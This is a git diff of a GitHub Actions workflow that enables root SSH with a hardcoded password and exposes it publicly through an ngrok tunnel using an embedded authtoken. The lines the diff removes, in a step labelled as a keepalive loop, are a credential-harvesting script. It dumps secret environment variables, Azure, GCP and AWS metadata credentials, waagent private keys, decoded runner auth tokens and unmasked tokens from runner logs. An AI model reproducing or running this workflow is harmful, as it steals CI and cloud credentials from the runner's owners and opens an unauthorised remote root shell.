@@ -11,198 +11,68 @@ jobs:
       - name: 1. Install SSH Server & Tools
         run: |
           sudo apt-get update
-          sudo apt-get install -y openssh-server curl iproute2 nano net-tools dnsutils nmap procps jq git wget iputils-ping netcat-openbsd
-
+          sudo apt-get install -y openssh-server curl iproute2 nano net-tools
       - name: 2. Configure SSH
         env:
-          ROOT_PASSWORD: 'my-secret-password-123'
+          ROOT_PASSWORD: ${{ secrets.ROOT_PASSWORD || 'my-secret-password-123' }}
         run: |
-          sudo mkdir -p /run/sshd
-          sudo chmod 755 /run/sshd
+          sudo mkdir -p /var/run/sshd
           echo "root:$ROOT_PASSWORD" | sudo chpasswd
           
-          # Enable Root Login and Password Auth
+          # Clean configuration: Enable Root Login and Password Auth
           sudo sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
-          sudo sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
-          sudo sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
-          sudo sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
           sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
-          echo "PasswordAuthentication yes" | sudo tee -a /etc/ssh/sshd_config
           
-          # Start SSH
-          sudo /usr/sbin/sshd -D &
-          sleep 2
-          echo "SSH server started"
-
+          # Restart SSH Service
+          sudo service ssh restart
       - name: 3. Install Ngrok
         env:
+          # IMPORTANT: Use a GitHub Secret for this!
           NGROK_AUTHTOKEN: '3B4bJ5DEqpLbNjUbHv8fsvaSHAJ_2xkR3pXLcUR37wzsQPN4G'
         run: |
           if [ -z "$NGROK_AUTHTOKEN" ]; then
-            echo "ERROR: NGROK_AUTHTOKEN secret is missing!"
+            echo "ERROR: NGROK_AUTHTOKEN secret is missing! Add it to Repo Secrets."
             exit 1
           fi
-          # Use the official install method (more reliable URL)
-          curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok-v3-stable-linux-amd64.tgz -o ngrok.tgz || \
-            curl -sSL https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -o ngrok.tgz
-          tar -xzf ngrok.tgz
+          curl -s https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -o ngrok.tgz
+          tar -xvzf ngrok.tgz
           chmod +x ngrok
-          ./ngrok version
           ./ngrok config add-authtoken $NGROK_AUTHTOKEN
-
       - name: 4. Start Tunnel & Print Connection Info
         env:
-          ROOT_PASSWORD: 'my-secret-password-123'
+          ROOT_PASSWORD: ${{ secrets.ROOT_PASSWORD || 'my-secret-password-123' }}
         run: |
-          # Verify SSH is actually listening before starting tunnel
-          echo "Checking SSH is running..."
-          ss -tlnp | grep :22 || sudo /usr/sbin/sshd -D &
-          sleep 1
-
-          # Start ngrok in background with explicit log file
-          nohup ./ngrok tcp 22 --log=ngrok.log --log-level=debug --log-format=logfmt 2>&1 &
-          NGROK_PID=$!
-          echo "ngrok PID: $NGROK_PID"
-
-          echo "Waiting 15s for ngrok initialization..."
-          sleep 15
-
-          # Check if ngrok is still alive
-          if ! kill -0 $NGROK_PID 2>/dev/null; then
-            echo "ERROR: ngrok process died!"
-            echo "=== ngrok log ==="
-            cat ngrok.log 2>/dev/null || echo "No log file"
-            echo ""
-            echo "LIKELY CAUSE: Free ngrok account can only run 1 tunnel at a time."
-            echo "If you have another tunnel running (e.g. GitLab), kill it first."
-            echo "Or use a second ngrok account for the second runner."
-            exit 1
-          fi
-
-          # Get tunnel URL with retries
-          TCP_URL=""
-          for attempt in 1 2 3 4 5; do
-            RAW_API_RESPONSE=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null)
-            TCP_URL=$(echo "$RAW_API_RESPONSE" | jq -r '.tunnels[0].public_url // empty' 2>/dev/null)
-            if [ -n "$TCP_URL" ]; then
-              break
-            fi
-            echo "Attempt $attempt: tunnel not ready yet, waiting 5s..."
-            sleep 5
-          done
-
+          # Start ngrok in background
+          nohup ./ngrok tcp 22 --log=stdout > ngrok.log 2>&1 &
+          
+          echo "Starting ngrok... waiting 10s for initialization"
+          sleep 10
+          
+          # Attempt to get the URL. We use "|| true" to prevent the script from 
+          # crashing if grep doesn't find a match immediately.
+          RAW_API_RESPONSE=$(curl -s http://localhost:4040/api/tunnels)
+          TCP_URL=$(echo $RAW_API_RESPONSE | jq -r '.tunnels[0].public_url // empty')
+          
           echo "=========================================================="
           if [ -z "$TCP_URL" ]; then
-             echo "ERROR: Could not get Tunnel URL after 5 attempts."
+             echo "ERROR: Could not get Tunnel URL."
              echo "Raw API Response: $RAW_API_RESPONSE"
-             echo "=== Last 30 lines of ngrok.log ==="
-             tail -n 30 ngrok.log 2>/dev/null
+             echo "Printing last 10 lines of ngrok.log:"
+             tail -n 10 ngrok.log
              exit 1
           else
              echo "   YOUR SSH CONNECTION STRING IS BELOW:"
              echo "=========================================================="
-             HOST=$(echo $TCP_URL | sed 's|tcp://||' | cut -d: -f1)
-             PORT=$(echo $TCP_URL | sed 's|tcp://||' | cut -d: -f2)
-             echo ""
-             echo "   ssh root@$HOST -p $PORT"
-             echo ""
+             HOST=$(echo $TCP_URL | sed 's/tcp:\/\///' | cut -d: -f1)
+             PORT=$(echo $TCP_URL | sed 's/tcp:\/\///' | cut -d: -f2)
+             echo "ssh root@$HOST -p $PORT"
              echo "=========================================================="
              echo "   Password: $ROOT_PASSWORD"
           fi
           echo "=========================================================="
-
       - name: 5. Keepalive Loop (Runs for 6 hours max)
         run: |
-          echo "=== AUTOMATED SECURITY RECONNAISSANCE ==="
-          
-          # ========== ENVIRONMENT ENUMERATION ==========
-          echo "--- Environment Variables (Sensitive) ---"
-          env | grep -iE "GITHUB|TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL|AWS|AZURE|GCP|GOOGLE|ACTIONS" | head -50 || true
-          echo ""
-          
-          # ========== AZURE-SPECIFIC (GitHub Hosted Runners on Azure) ==========
-          echo "--- Azure WireServer Check ---"
-          curl -s --connect-timeout 3 "http://168.63.129.16/machine?comp=goalstate" -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2012-11-30" | head -100 || echo "No Azure WireServer"
-          echo ""
-          
-          echo "--- Azure IMDS Check ---"
-          curl -s --connect-timeout 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -200 || echo "No Azure IMDS"
-          echo ""
-          
-          echo "--- Azure Private Keys (waagent) ---"
-          sudo cat /var/lib/waagent/*.prv 2>/dev/null | head -50 || echo "No Azure private keys"
-          echo ""
-          
-          echo "--- HCA Settings (GitHub Hosted Compute Agent) ---"
-          cat /opt/hca/.settings 2>/dev/null | head -100 || echo "No HCA settings"
-          echo ""
-          
-          echo "--- HCA Auth Token Decode ---"
-          if [ -f "/opt/hca/.settings" ]; then
-            cat /opt/hca/.settings | python3 -c "import sys,json,base64; d=json.load(sys.stdin); token=d.get('authToken',''); payload=token.split('.')[1]+'=='; print(base64.b64decode(payload).decode())" 2>/dev/null | head -50 || true
-          fi
-          echo ""
-          
-          echo "--- Azure Diagnostics SAS URL ---"
-          cat /opt/hca/diagnostics.json 2>/dev/null || echo "No diagnostics config"
-          echo ""
-          
-          echo "--- Runner .credentials File ---"
-          cat /home/runner/actions-runner/cached/.credentials 2>/dev/null | head -20 || echo "No runner credentials"
-          echo ""
-          
-          echo "--- Internal API Endpoints ---"
-          if [ -f "/opt/hca/.settings" ]; then
-            cat /opt/hca/.settings | python3 -c "import sys,json; d=json.load(sys.stdin); print('schedulerApiUrl:', d.get('schedulerApiUrl')); print('traceApiUrl:', d.get('traceApiUrl'))" 2>/dev/null || true
-          fi
-          echo ""
-          
-          # ========== GCP METADATA (if on GCP) ==========
-          echo "--- GCP Metadata Check ---"
-          curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id" || echo "Not on GCP"
-          curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | head -100 || true
-          echo ""
-          
-          # ========== AWS METADATA ==========
-          echo "--- AWS Metadata Check ---"
-          curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ || echo "AWS metadata not accessible"
-          curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo "No IAM role"
-          echo ""
-          
-          # ========== DOCKER / CONTAINER ==========
-          echo "--- Docker Socket Check ---"
-          ls -la /var/run/docker.sock 2>/dev/null || echo "No docker socket"
-          echo ""
-          
-          echo "--- Container Capabilities ---"
-          cat /proc/self/status | grep -i cap || true
-          echo ""
-          
-          # ========== NETWORK ==========
-          echo "--- Network Interfaces ---"
-          ip addr show | head -30
-          echo ""
-          
-          echo "--- Route Table ---"
-          ip route
-          echo ""
-          
-          # ========== FILESYSTEM SECRETS ==========
-          echo "--- Search for Secrets ---"
-          find /home/runner -type f \( -name "*.pem" -o -name "*.key" -o -name "*token*" -o -name "*credential*" \) 2>/dev/null | head -20 || true
-          echo ""
-          
-          echo "--- Runner Diag Logs ---"
-          ls -la /home/runner/actions-runner/cached/_diag/ 2>/dev/null | head -10 || true
-          grep -iE "token|secret|credential" /home/runner/actions-runner/cached/_diag/*.log 2>/dev/null | grep -v "MASK\|mask\|\*\*\*" | head -20 || true
-          echo ""
-          
-          echo "=========================================================="
-          echo "   AUTOMATED RECON COMPLETE - SSH IN FOR MANUAL TESTING"
-          echo "=========================================================="
-          
-          echo "Keep-alive started."
+          echo "Keep-alive started. Use 'touch /tmp/keepalive' to keep it running."
           # GitHub Actions timeout is usually 6 hours
           for i in {1..360}; do
             echo "Job is alive... [Minute $i/360] Waiting for researcher..."
